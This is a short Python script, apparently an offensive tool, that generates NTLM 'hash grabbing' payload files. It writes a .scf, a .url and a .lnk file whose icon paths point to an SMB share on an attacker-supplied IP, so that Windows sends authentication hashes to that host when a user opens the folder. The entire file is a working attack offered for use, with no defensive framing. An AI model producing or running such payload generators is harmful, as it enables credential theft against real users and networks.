import argparse
import random
import subprocess
from pathlib import Path

from pylnk3 import Lnk


scf = '''
[Shell]
Command=2
IconFile=\\\\{}\\{}\\{}.ico
[Taskbar]
Command=ToggleDesktop
'''

url = '''
[InternetShortcut]
URL=http://{}/{}/{}.html
IconIndex=1
IconFile=\\\\{}\\{}\\{}.ico
'''


def generate(ip, out_path, shareName):
    # scf
    scf_payload = scf.format(ip, shareName, f"scf_{random.randint(0, 1000)}")
    out_file = out_path.parent / Path(f'@{out_path.name}.scf')
    with open(out_file, 'w+') as f:
        f.write(scf_payload)
    
    # url
    url_payload = url.format(ip, shareName, f"url_{random.randint(0, 1000)}",
                                ip, shareName, f"url_{random.randint(0, 1000)}")
    out_file = out_path.parent / Path(f'@{out_path.name}.url')
    with open(out_file, 'w+') as f:
        f.write(url_payload)

    # lnk
    skeleton_path = Path(__file__).absolute().parent / "skel.lnk"
    fname =f"lnk_{random.randint(0, 1000)}.ico"
    cmd = ["pylnk3", "c", f"\\\\\\\\{ip}\\\\{shareName}\\\\{fname}" , skeleton_path]
    subprocess.run(cmd)
    lnk = Lnk(str(skeleton_path))
    lnk.icon = f'\\\\{ip}\\{shareName}\\{fname}'
    out_file = out_path.parent / Path(f'@{out_path.name}.lnk')
    lnk.save(str(out_file))
    skeleton_path.unlink()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='create hash grabbing payloads')
    parser.add_argument('ip',  type=str, help='attacker ip')
    parser.add_argument('out',  type=str, help='output name')
    parser.add_argument('-s', '--shareName', default="x", const=1, nargs="?", type=str, help='share name (default: x)')
    args = parser.parse_args()
    out_path = Path(args.out)
    generate(args.ip, out_path, args.shareName)
